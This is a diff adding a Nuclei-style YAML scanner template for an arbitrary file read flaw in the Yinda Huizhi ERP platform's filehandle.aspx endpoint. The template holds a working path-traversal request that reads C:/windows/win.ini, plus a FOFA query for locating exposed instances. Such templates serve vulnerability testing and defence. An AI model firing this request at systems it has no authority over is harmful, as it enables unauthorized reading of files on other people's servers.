@@ -1,0 +1,34 @@
+id: windor-filehandle-fileread
+info:
+  name: 银达汇智智慧综合管理平台ERP filehandle.aspx 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/k3ppf0r/2024-PocLib/blob/f64375e23082dff16b86ab07b2f452bd7156a31d/2024-7-xray/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ERP%20filehandle.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/readfile.yml#L4
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="智慧综合管理平台登入"
+    tips:
+    repair:
+    version:
+  tags: fileread,windor
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini"
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
+
+      - type: status
+        status:
+          - 200
